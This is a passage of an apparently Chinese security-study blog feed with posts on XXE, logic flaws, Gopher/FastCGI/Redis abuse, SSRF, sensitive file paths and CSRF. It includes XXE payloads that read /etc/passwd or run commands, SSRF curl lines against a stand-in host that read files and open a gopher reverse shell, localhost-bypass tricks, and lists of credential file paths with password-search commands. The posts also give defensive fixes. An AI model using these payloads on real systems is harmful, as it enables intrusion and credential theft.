&quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre></li><li>内网端口扫描<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.124:4444/test&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;&lt;/r&gt;</code></pre></li><li>攻击内网网站（命令执行）<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;except://id&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre></li><li>发起dos攻击等危害（拒绝服务）</li></ol><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol><li>过滤用户提交的XML数据</li><li>将PHP程序的libxml_disable_entity_loader设置为TRUE来禁用外部实体</li><li>java如下更改配置<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre></li><li>python如下配置<pre><code>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre></li></ol><h4 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h4><p><a href="https://smms.app/image/mKHhc1M6lY5OjnD" target="_blank"><img src="https://s2.loli.net/2023/07/19/mKHhc1M6lY5OjnD.png" ></a></p><p><code>XSS</code> 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。<br>修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p><p><code>CSRF</code> 是跨站请求伪造攻击，没有在关键操作执行时进行是否由用户自愿发起的确认。<br>修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.</p><p><code>XXE</code> 是XML中可以通过调用实体来请求本地或者远程内容<br>修复方式：XML解析库在调用时严格禁止对外部实体的解析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;了解XML&quot;&gt;&lt;a href=&quot;#了解XML&quot; class=&quot;headerlink&quot; title=&quot;了解XML&quot;&gt;&lt;/a&gt;了解XML&lt;/h4&gt;&lt;p&gt;XML 是一种标记语言，很类似于 HTML&lt;br&gt;XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息</summary>
      
    
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="https://liu1272.github.io/2023/07/09/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://liu1272.github.io/2023/07/09/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-07-09T07:53:00.000Z</published>
    <updated>2023-07-09T08:11:02.285Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><a href="https://smms.app/image/XQtTYJOM86jfR1K" target="_blank"><img src="https://s2.loli.net/2023/07/09/XQtTYJOM86jfR1K.png" ></a></p><h4 id="常见的逻辑漏洞"><a href="#常见的逻辑漏洞" class="headerlink" title="常见的逻辑漏洞"></a>常见的逻辑漏洞</h4><h5 id="订单任意金额修改"><a href="#订单任意金额修改" class="headerlink" title="订单任意金额修改"></a>订单任意金额修改</h5><p>相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。<br><strong>预防思路：</strong></p><ul><li>订单需要多重效验</li><li>订单数值较大的时候需要人工审核<h5 id="验证码回传"><a href="#验证码回传" class="headerlink" title="验证码回传"></a>验证码回传</h5>该类型漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件</li></ul><p><strong>预防思路：</strong></p><ul><li>验证码不要放在数据包内，而是在后端验证，缺点是服务器的运算压力也会随之增加</li><li>如果要进行前端验证的话也可以，但是需要进行加密<h5 id="未进行登陆凭证验证"><a href="#未进行登陆凭证验证" class="headerlink" title="未进行登陆凭证验证"></a>未进行登陆凭证验证</h5>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未<br>经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没<br>验证ID或cookie验证导致越权。</li></ul><p><strong>预防思路：</strong></p><ul><li>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证<h5 id="接口无限制枚举"><a href="#接口无限制枚举" class="headerlink" title="接口无限制枚举"></a>接口无限制枚举</h5></li></ul><p><strong>漏洞点：</strong></p><ul><li>某电商登陆接口无验证导致撞库</li><li>某招聘网验证码无限制枚举</li><li>某快递公司优惠券枚举</li><li>某电商会员卡卡号枚举</li></ul><p><strong>预防思路：</strong></p><ul><li>在输入接口设置验证，如token，验证码，并使用后端验证。</li><li>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。</li><li>验证码尽量使用6位以上字母加数字进行组合，并且设定较短时间期限。</li><li>号码尽量不要存在规律性和简短性<h5 id="cookie设置存在缺陷"><a href="#cookie设置存在缺陷" class="headerlink" title="cookie设置存在缺陷"></a>cookie设置存在缺陷</h5></li></ul><p><strong>漏洞点：</strong></p><ul><li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单</li><li>cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法</li><li>越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限</li></ul><p><strong>预防思路：</strong></p><ul><li>cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才<br>能返回数据。</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。</li><li>用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。</li><li>cookie中设定session参数，以防cookie可以长时间生效。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://smms.app/image/XQtTYJOM86jfR1K&quot; target=&quot;_blank&quot;&gt;&lt;img </summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>协议拓展</title>
    <link href="https://liu1272.github.io/2023/07/08/%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95/"/>
    <id>https://liu1272.github.io/2023/07/08/%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95/</id>
    <published>2023-07-07T19:03:00.000Z</published>
    <updated>2023-07-07T20:05:59.821Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>在WWW出现之前，Gopher是Internet上最主要的信息检索工具<br>GOPHER协议是一种比HTTP协议还要古老的协议，默认工作端口70<br>GOPHER协议可以以单个URL的形式传递POST请求，同时支持换行（能换行就有很大操作空间）</p><h4 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h4><pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流注意要有一个_，这个符号可以换成任意一个字符</code></pre><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>准备好请求数据</p><pre><code>GET /testg.php?name=xxx HTTP/1.1Host: 10.211.55.2</code></pre><p>用BP全编码</p><pre><code>%47%45%54%20%2f%74%......</code></pre><p>加上格式</p><pre><code>gopher://10.211.55.2:80/_%47%45%54%20%2f%74%......</code></pre><p><em><strong>编码的时候在最后一定要补%0d%0a代表结束<br>问号需要转码为URL编码，也就是%3f</strong></em></p><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><p>准备好请求数据</p><pre><code>POST /testg.php HTTP/1.1Host: 10.211.55.2Content-Type: application/x-www-form-urlencodedContent-Length: 8 name=xxx</code></pre><p>用BP全编码</p><pre><code>%50%4f%53%54%20%2f%74%65%73%7......</code></pre><p>加上格式</p><pre><code>gopher://10.211.55.2:80/_%50%4f%53%54%20%2f%74%65%73%7......</code></pre><p><em><strong>编码的时候在最后一定要补%0d%0a代表结束<br>问号需要转码为URL编码，也就是%3f</strong></em></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>协议可以几乎无限制地传输各种数据</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>反弹shell</p><pre><code>http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc</code></pre><p><a href="https://gitcode.net/mirrors/tarunkant/Gopherus?utm_source=csdn_github_accelerator">监测及RCE工具</a></p><h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>FastCGI协议和HTTP协议一样是通信协议<br>http是浏览器（也就是客户端）和服务器中间件之间通信的协议，而FastCGI协议是服务器中间件和某种语言编写的正在运行的后端程序间的通信协议。<br>它支持分布式的运算，所以 FastCGI 程序可以在网站服务器以外的主机上执行，并且可以接受来自其它网站服务器的请求<br>FastCGI将CGI解释器进程保持在内存中，以此获得较高的性能</p><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p><a href="https://smms.app/image/oWEr76O4A5hLaJj" target="_blank"><img src="https://s2.loli.net/2023/07/08/oWEr76O4A5hLaJj.png" ></a></p><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>PHP-FPM（fastcgi进程管理器）默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>需要一个php文件，首选/var/www/html/index.php</li><li>然后要在PHP.INI中打开配置项auto_prepend_file和auto_append_file</li><li>接着使用上面说的那个Gopherus工具生成payload</li><li>根据配置文件Web Server辨别不是静态文件，此时就需要去找 PHP解析器来处理</li><li>Web Server收到 index.php 这个请求后，会启动对应的CGI 程序，也就是PHP解析器</li><li>PHP解析器会解析php.ini文件，然后就执行完一整个工作流程返回数据</li></ol><h3 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h3><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><p>redis是一个key-value存储系统<br>它对数据支持复杂的操作、支持各种不同方式的排序、为了保证效率数据缓存在内存中<br>redis数据库一种，默认绑定在0.0.0.0:6379，攻击者直接可以访问到<br>默认无密码，登录账户为root</p><h4 id="存在漏洞"><a href="#存在漏洞" class="headerlink" title="存在漏洞"></a>存在漏洞</h4><ol><li>未授权访问</li><li>访问敏感文件</li><li>root权限写入webshell</li><li>root权限写入公私钥</li></ol><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>能访问到、能登录、能写入（有root）</p><ol><li>开放在公网，没有和ip绑定，默认无密码</li><li>root权限</li><li>webshell和公私钥匙通信原理</li><li>有可能把redis的默认端口6379修改</li></ol><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h5><p>Redis默认情况下，会绑定在0.0.0.0:6379<br>如果没有配置非信任来源的IP访问限制，就会将Redis服务暴露在公网上<br>如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据</p><h5 id="Redis写入Webshell"><a href="#Redis写入Webshell" class="headerlink" title="Redis写入Webshell"></a>Redis写入Webshell</h5><p>如果存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限<br>即可通过redis在指定的web目录下写入一句话木马，用菜刀连接可达到控制服务器的目的</p><h5 id="Redis密钥登录SSH"><a href="#Redis密钥登录SSH" class="headerlink" title="Redis密钥登录SSH"></a>Redis密钥登录SSH</h5><p>redis对外开放，且是未授权访问状态，并且redis服务ssh对外开放，可以通过key登入时<br>在数据库中插入一条数据，将本机的公钥作为value，key值随意<br>然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys<br>把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key</p><h5 id="利用计划任务反弹shell"><a href="#利用计划任务反弹shell" class="headerlink" title="利用计划任务反弹shell"></a>利用计划任务反弹shell</h5><p>利用Redis未授权漏洞，可以通过写入文件到系统计划任务目录 /var/spool/cron下来执行</p><h5 id="远程主从复制RCE"><a href="#远程主从复制RCE" class="headerlink" title="远程主从复制RCE"></a>远程主从复制RCE</h5><p>4.x、5.x版本中，Redis提供了主从模式<br>主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写<br>通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式<br>在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件<br>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令<br>缺点是如果目标机子只允许本地登录，则这种利用方法就不行了</p><h5 id="本地Redis主从复制RCE反弹shell"><a href="#本地Redis主从复制RCE反弹shell" class="headerlink" title="本地Redis主从复制RCE反弹shell"></a>本地Redis主从复制RCE反弹shell</h5><p>对于只允许本地连接的Redis服务器，可以通过开启主从模式从远程主机上同步恶意.so文件至本地，接着载入恶意.so文件模块，反弹shell至远程主机。</p><h4 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h4><p>redis的安全设置：设置完毕，需要重加载配置文件启动redis</p><ol><li>绑定内网ip地址进行访问</li><li>requirepass设置redis密码</li><li>保护模式开启protected-mode开启（默认开启）</li><li>最好把端口更改</li><li>单独为redis设置一个普通账号，启动redis</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Gopher协议&quot;&gt;&lt;a href=&quot;#Gopher协议&quot; class=&quot;headerlink&quot; title=&quot;Gopher协议&quot;&gt;&lt;/a&gt;Gopher协议&lt;/h3&gt;&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SSRF服务器端请求伪造</title>
    <link href="https://liu1272.github.io/2023/07/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>https://liu1272.github.io/2023/07/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2023-07-07T07:50:00.000Z</published>
    <updated>2023-07-19T07:17:42.230Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞<br>SSRF攻击的目标一般是作为跳板机访问从外网无法访问的内部系统<br>（正是因为它是由服务端发起的，所以它能够请求到内网）<br><a href="https://smms.app/image/daoBFcPQqzvXkpy" target="_blank"><img src="https://s2.loli.net/2023/07/07/daoBFcPQqzvXkpy.png" width="500" /></a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制<br>因此可以从指定URL地址获取网页完本内容、加载指定地址的图片、下载等。</p><h4 id="利用价值"><a href="#利用价值" class="headerlink" title="利用价值"></a>利用价值</h4><p>利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol><li>探测内网信息,用协议探<code>ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;</code>（dict协议）</li><li>攻击内网或本地其他服务（比如溢出）</li><li>穿透防火墙</li><li>对内网web应用进行指纹识别，通过访问应用存在的默认文件实现</li><li>利用file协议读取本地文件</li><li>利用Redis未授权访问，HTTP CRLF注入</li><li>DOS攻击（请求大文件，始终保持连接keep alive always）等等</li><li>ophergopher协议/gopher协议访问，反弹shell</li></ol><h4 id="漏洞出现点"><a href="#漏洞出现点" class="headerlink" title="漏洞出现点"></a>漏洞出现点</h4><ol><li>能够对外发起网络请求的地方</li><li>请求远程服务器资源的地方</li><li>数据库内置功能</li><li>邮件系统</li><li>文件处理</li><li>在线处理工具</li></ol><p><strong>举几个例子：</strong></p><ol><li>在线识图，在线文档翻译，分享，订阅等</li><li>根据远程URL上传，静态资源图片等</li><li>数据库的比如mongodb的copyDatabase函数</li><li>邮件系统就是接收邮件服务器地址这些地方。</li><li>文件就找ImageMagick，xml这些。</li><li>从URL关键字（source,share,link,src,imageurl,target等）</li></ol><h4 id="SSRF漏洞相关函数和类"><a href="#SSRF漏洞相关函数和类" class="headerlink" title="SSRF漏洞相关函数和类"></a>SSRF漏洞相关函数和类</h4><p>file_get_contents()将整个文件或一个url所指向的文件读入一个字符串中。<br>readfile()输出一个文件的内容。<br>fsockopen()打开一个网络连接或者一个Unix 套接字连接。<br>curl_exec()初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。<br>fopen()打开一个文件文件或者 URL。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>http协议访问<code>url=http://127.0.0.1/1.txt</code></li><li><a href="https://www.cnblogs.com/endust/p/11804767.html">PHP伪协议访问</a><a href="https://smms.app/image/IHa9JMnTCySpNWO" target="_blank"><img src="https://s2.loli.net/2023/07/07/IHa9JMnTCySpNWO.png" width="600" /></a></li><li>Gopher协议</li><li>FastCGI协议</li><li>Redis协议<br>```<h1 id="利用file协议查看文件"><a href="#利用file协议查看文件" class="headerlink" title="利用file协议查看文件"></a>利用file协议查看文件</h1>curl -v ‘<a href="http://sec.com/ssrf.php?url=file:///etc/passwd&#39;">http://sec.com/ssrf.php?url=file:///etc/passwd&#39;</a></li></ol><h1 id="利用dict探测端口"><a href="#利用dict探测端口" class="headerlink" title="利用dict探测端口"></a>利用dict探测端口</h1><p>curl -v ‘<a href="http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&#39;">http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&#39;</a></p><h1 id="利用gopher协议反弹shell"><a href="#利用gopher协议反弹shell" class="headerlink" title="利用gopher协议反弹shell"></a>利用gopher协议反弹shell</h1><p>curl -v ‘<a href="http://sec.com/ssrf.php?url=gopher://127.0.0.1:6379/_....&#39;">http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....&#39;</a></p><pre><code>#### 绕过姿势1. 利用HTTP基本身份认证的方式绕过`http://example.com@127.0.0.1`2. 利用IP地址的省略写法绕过,`http://123.254.34.254&gt;&gt;http://[::123.254.34.254]`3. DNS解析 `http://127.0.0.1.xip.io/` 可以指向任意ip的域名：`xip.io`4. 利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址[**绕过**](https://tool.520101.com/wangluo/jinzhizhuanhuan/)5. `http://127.1/a.txt` 或者 `http://0/a.txt`6. file_get_contents()函数遇到了不认识的伪协议头 `httpsssss://` ，就会将他当做文件夹，然后再配合目录穿越即可读取文件#### 其他各种指向127.0.0.1的地址</code></pre><p><a href="http://localhost/">http://localhost/</a>         # localhost就是代指127.0.0.1<br><a href="http://0.0.0.0/">http://0/</a>                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行<br>http://[::]:80/           # 在liunx下可用，window测试了下不行<br><a href="http://127.0.0.1/">http://127。0。0。1/</a>       # 用中文句号绕过<br>http://①②⑦.⓪.⓪.①<br><a href="http://127.0.0.1/">http://127.1/</a><br><a href="http://127.0.0.1/">http://127.00000.00000.001/</a> # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p><p>```</p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>1.地址做白名单处理<br>2.域名识别IP 过滤内部IP<br>3.校验返回的内容对比是否与假定的一致</p><h4 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h4><ul><li>CSRF是跨站请求伪造攻击，由客户端发起</li><li>SSRF是服务器端请求伪造，由服务器发起</li><li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞&lt;br&gt;SSRF攻击的目标一般是作为跳板机访问从外网无法访问的内部系统&lt;br&gt;（</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>系统敏感文件路径汇总</title>
    <link href="https://liu1272.github.io/2023/07/07/%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E6%B1%87%E6%80%BB/"/>
    <id>https://liu1272.github.io/2023/07/07/%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E6%B1%87%E6%80%BB/</id>
    <published>2023-07-07T07:24:00.000Z</published>
    <updated>2023-07-28T13:55:24.986Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre><code>c:/boot.ini //查看系统版本c:/windows/php.ini //php配置信息c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码c:/winnt/php.inic:/winnt/my.inic:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码c:\Program Files\Serv-U\ServUDaemon.inic:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此c:\Program Files\RhinoSoft.com\ServUDaemon.exeC:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件//存储了pcAnywhere的登陆密码c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机d:\APACHE\Apache2\conf\httpd.confC:\Program Files\mysql\my.iniC:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码%WINDIR%%WINDIR%\system32%TEMP%%LOCALAPPDATA%%APPDATA%</code></pre><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre><code>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件/usr/local/apache2/conf/httpd.conf/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/usr/local/app/php5/lib/php.ini //PHP相关设置/etc/sysconfig/iptables //从中得到防火墙规则策略/etc/httpd/conf/httpd.conf // apache配置文件/etc/rsyncd.conf //同步程序配置文件/etc/my.cnf //mysql的配置文件/etc/redhat-release //系统版本/etc/issue/etc/issue.net/usr/local/app/php5/lib/php.ini //PHP相关设置/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/sysconfig/iptables 查看防火墙策略etc/passwd   用户信息文件etc/crontab   定时任务文件etc/anacrontab   异步定时任务文件etc/rc.d/rc.local   开机启动项var/log/btmp   登录失败日志，使用last命令查看var/log/cron   定时任务执行日志/var/log/lastlog   所有用户最近登录信息，使用lastlog查看var/log/secure   验证、授权等日志var/log/wtmp   包含用户登录日志，使用last命令查看var/log/utmp   当前登录系统的用户信息，使用last命令查看</code></pre><h4 id="文件寻找方法"><a href="#文件寻找方法" class="headerlink" title="文件寻找方法"></a>文件寻找方法</h4><pre><code>【Windows】# 全盘查找文件，一定要加一个星号！for /r c:\ %i in (password.txt*) do @echo %ifor /r c:\ %i in (*.ini) do @echo %i# 查找 C 盘中包含 password 字样的文件，一定要双引号！findstr /s /n &quot;password&quot; c:\*# 查找 pwd.txt 中是否包含 password 字样，一定要双引号！find /N /I &quot;password&quot; pwd.txt【Linux】# 查找文件find / -name filename.ext# 全盘查找含有 flag 的文件grep flag -r /</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Windows&quot;&gt;&lt;a href=&quot;#Windows&quot; class=&quot;headerlink&quot; title=&quot;Windows&quot;&gt;&lt;/a&gt;Windows&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;c:/boot.ini //查看系统版本

c:/windows/php.ini /</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>CSRF跨站点请求伪造</title>
    <link href="https://liu1272.github.io/2023/07/07/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>https://liu1272.github.io/2023/07/07/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2023-07-07T06:29:00.000Z</published>
    <updated>2023-07-19T07:17:14.957Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>是社工的一种，不大流行，但如果被成功利用，危害很大。</p><h4 id="XSS与CSRF区别"><a href="#XSS与CSRF区别" class="headerlink" title="XSS与CSRF区别"></a>XSS与CSRF区别</h4><p>XSS通过<code>盗取</code>网站内的已有的用户的身份，然后再执行相关操作<br>CSRF通过<code>伪装</code>用户身份，通过服务器身份认证后，然后发送恶意请求<br>虽然两者有一些区别，但是通常结合使用</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在浏览器中cookie在一段时间内是不会过期（不关闭或者退出浏览器）<br>如果在cookie存在期间，通过构造csrf脚本或包含csrf脚本的链接发送给用户<br>得到信息后，再伪造成用户身份，执行相关操作<br>攻击者盗用了受害者的身份，以受害者的名义发送恶意请求<br>对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>比如发消息、盗号、转账等没有没有需要再次验证身份的基本操作<br>再要验证身份的话，那就再社工搭建一个一模一样的网站</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p><strong>站外攻击：</strong><br>用户在攻击者构造的网站中触发伪造请求时，强制用户客户端就会发起请求<br><strong>站内攻击：</strong><br>如果开发人员滥用 <code>$_REQUEST</code> 类变量，以Post提交的数据表单，也支持Get传参。<br>攻击者把预测的请求参数上传到站内贴子或留言的图片链接里<br>当用户浏览了含有请求参数的页面就强制发出这些请求。</p><h4 id="危害"><a href="#危害" class="headerlink" 